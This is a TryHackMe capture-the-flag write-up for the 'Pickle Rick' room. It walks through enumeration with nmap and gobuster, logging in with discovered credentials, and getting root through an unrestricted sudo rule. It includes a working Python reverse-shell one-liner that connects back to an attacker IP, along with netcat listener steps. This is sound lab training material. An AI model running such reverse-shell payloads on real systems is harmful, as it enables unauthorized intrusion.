---
title: "TryHackMe - Pickle Rick"
author: Nasrallah
description: "Writeup of easy machine Pickle Rick"
date: 2021-12-27 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, web, reverse-shell, python, gobuster]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

Hello l33ts, I hope you are doing well. Today we are going to look at [Pickle Rick](https://tryhackme.com/room/picklerick) from TryHackMe.

# **Description**

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

# **Enumeration**

As usual, let's start our nmap scan using this commad : `sudo nmap -sV -sC {target_IP} -oN nmap.scan`

-sV - find the version of all the service running on the target

-sC - run all the default scripts

-oN - save the output in a file called nmap

## nmap

```terminal
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 10:06 EST
Nmap scan report for 10.10.237.232
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 85:92:6a:04:0e:1c:53:94:c6:8b:84:5f:c3:a3:fc:41 (RSA)
|   256 c1:9b:c3:79:38:ee:e2:ed:fc:85:57:4f:ae:ef:2a:12 (ECDSA)
|_  256 81:d8:73:fe:2d:c0:ce:79:43:bc:56:e7:c9:64:aa:58 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds
```

We see that there is 2 open ports:
- 22(SSH)
- 80(HTTP)

Let's check the web server. Oh no, it seems that Rick is in a problem, anyway, let's check the page source code.

![Sourcecode](/assets/img/tryhackme/pickle/source.png)

Nice, we have found a username,Let's now run Gobuster directory scan using the following command: `gobuster dir -w /usr/share/wordlists/dirb/common.txt  -u {target_IP} -x php,txt`

- -x: is to tell gobuster to search for extensions(php, txt)

## Gobuster

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.237.232
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/12/24 10:19:06 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.hta.txt             (Status: 403) [Size: 296]
/.hta.php             (Status: 403) [Size: 296]
/.htaccess.txt        (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd.php        (Status: 403) [Size: 301]
/.htaccess.php        (Status: 403) [Size: 301]
/.htpasswd.txt        (Status: 403) [Size: 301]
/assets               (Status: 301) [Size: 315] [--> http://10.10.237.232/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]                    
/index.html           (Status: 200) [Size: 1062]                                  
/login.php            (Status: 200) [Size: 882]                                   
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                    
/robots.txt           (Status: 200) [Size: 17]                                    
/robots.txt           (Status: 200) [Size: 17]                                    
/server-status        (Status: 403) [Size: 301]                                   

===============================================================
```

Gobuster has found some good stuff, we have a login page and robots.txt file, let's check the latter.

That's a weird string we have found, let's save it and go check to login page.
We have the username and the weird string we found in robots.txt, let's supply them and see what happens.

Great, we are in, and it seems we have a command panel where we can execute code on the target, let's try to get a reverse shell with that.

# **Foothold**

After checking that python3 is installed on the target machine with `which python3` command, i executed the following command to get a reverse shell on my machine after setting up a listener of cource: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

> You need to change the ip address in the command!

```terminal
$ nc -lnvp 9001                                                                                                                                      130 ⨯
listening on [any] 9001 ...
connect to [10.11.31.131] from (UNKNOWN) [10.10.237.232] 58428
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-10-237-232:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@ip-10-10-237-232:/var/www/html$ ^Z #pressed ctrl+z
zsh: suspended  nc -lnvp 9001

$ stty raw -echo; fg                                                                                                                             148 ⨯ 1 ⚙
[1]  + continued  nc -lnvp 9001 #pressed enter

www-data@ip-10-10-237-232:/var/www/html$ ls
Sup3rS3cretPickl3Ingred.txt  clue.txt    index.html  portal.php
assets                       denied.php  login.php   robots.txt
www-data@ip-10-10-237-232:/var/www/html$
```

The commands i executed are for getting a stable shell.

# **Privilege Escalation**

When we run `sudo -l ` we see that we can run whatever we want!

```terminal
www-data@ip-10-10-237-232:/home/rick$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-237-232.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-237-232.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-237-232:/home/rick$
```

This made our task much easier. With that, we can upgrade directly to root.

```terminal
www-data@ip-10-10-237-232:/home/rick$ sudo su
root@ip-10-10-237-232:/home/rick# whoami
root
root@ip-10-10-237-232:/home/rick#
```

And just like that we have rooted Pickle Rick machine, hope you guys enjoyed it. See you in the next Hack.
